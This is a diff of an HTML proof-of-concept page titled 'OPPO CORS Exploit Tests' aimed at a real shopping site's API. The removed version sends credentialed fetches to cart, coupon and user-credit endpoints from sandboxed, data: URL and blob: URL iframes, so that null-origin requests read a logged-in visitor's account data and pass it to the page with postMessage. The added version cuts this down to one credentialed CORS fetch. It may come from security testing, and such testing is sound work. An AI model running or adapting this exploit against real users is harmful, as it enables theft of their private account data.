@@ -1,207 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<head>
-<meta charset="UTF-8">
-<title>OPPO CORS Exploit Tests</title>
-
-<style>
-
-body{
-font-family:Arial;
-background:#eef2f7;
-margin:0;
-padding:30px;
-}
-
-.container{
-max-width:1100px;
-margin:auto;
-}
-
-h1{text-align:center}
-
-button{
-display:block;
-margin:20px auto;
-padding:12px 30px;
-background:#2e7df6;
-color:white;
-border:none;
-border-radius:6px;
-cursor:pointer;
-}
-
-.card{
-background:white;
-padding:15px;
-margin-bottom:15px;
-border-radius:8px;
-box-shadow:0 2px 6px rgba(0,0,0,.1);
-}
-
-.status{
-font-weight:bold;
-margin:8px 0;
-}
-
-pre{
-background:#111;
-color:#0f0;
-padding:12px;
-border-radius:6px;
-white-space:pre-wrap;
-word-break:break-word;
-min-height:40px;
-}
-
-</style>
-
-</head>
-
+<html>
 <body>
 
-<div class="container">
+<button onclick="run()">Run</button>
 
-<h1>OPPO CORS Exploit Multi-Origin Test</h1>
-
-<button onclick="runTests()">Run Exploit</button>
-
-<div id="results"></div>
-
-</div>
-
-<iframe id="sandboxFrame" sandbox="allow-scripts" style="display:none"></iframe>
+<pre id="out"></pre>
 
 <script>
 
-const endpoints={
+function run(){
 
-cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
 
+method:"GET",
+
+mode:"cors",
+
+credentials:"include",
+
+headers:{
+"Accept":"*/*",
+"Accept-Language":"en-US,en;q=0.9"
 }
-
-function createCard(name,method){
-
-let id=method+"_"+name
-
-let div=document.createElement("div")
-div.className="card"
-
-div.innerHTML=
-"<b>"+method.toUpperCase()+" → "+name+"</b>"+
-"<div class='status'>Status: <span id='"+id+"_status'>waiting</span></div>"+
-"<pre id='"+id+"_data'>no response yet</pre>"
-
-document.getElementById("results").appendChild(div)
-
-}
-
-for(let e in endpoints){
-
-createCard(e,"sandbox")
-createCard(e,"data")
-createCard(e,"blob")
-
-}
-
-window.addEventListener("message",e=>{
-
-let d=e.data
-let id=d.method+"_"+d.endpoint
-
-if(!document.getElementById(id+"_status")) return
-
-document.getElementById(id+"_status").innerText=d.status
-
-let output=d.body
-
-try{
-output=JSON.stringify(JSON.parse(d.body),null,2)
-}catch{}
-
-document.getElementById(id+"_data").innerText=output
 
 })
-
-function runTests(){
-
-runSandbox()
-runData()
-runBlob()
-
-}
-
-function buildScript(method){
-
-return `
-<script>
-
-const endpoints=${JSON.stringify(endpoints)}
-
-for(let name in endpoints){
-
-fetch(endpoints[name],{credentials:"include"})
-.then(r=>r.text().then(t=>{
-parent.postMessage({
-method:"${method}",
-endpoint:name,
-status:r.status,
-body:t
-},"*")
-}))
+.then(r=>r.text())
+.then(t=>{
+document.getElementById("out").textContent=t
+})
 .catch(e=>{
-parent.postMessage({
-method:"${method}",
-endpoint:name,
-status:"error",
-body:e.toString()
-},"*")
+document.getElementById("out").textContent=e
 })
-
-}
-
-<\/script>
-`
-
-}
-
-function runSandbox(){
-
-document.getElementById("sandboxFrame").srcdoc=buildScript("sandbox")
-
-}
-
-function runData(){
-
-let code=buildScript("data")
-
-let url="data:text/html;base64,"+btoa(code)
-
-let iframe=document.createElement("iframe")
-iframe.src=url
-iframe.style.display="none"
-
-document.body.appendChild(iframe)
-
-}
-
-function runBlob(){
-
-let code=buildScript("blob")
-
-let blob=new Blob([code],{type:"text/html"})
-
-let url=URL.createObjectURL(blob)
-
-let iframe=document.createElement("iframe")
-iframe.src=url
-iframe.style.display="none"
-
-document.body.appendChild(iframe)
 
 }
 
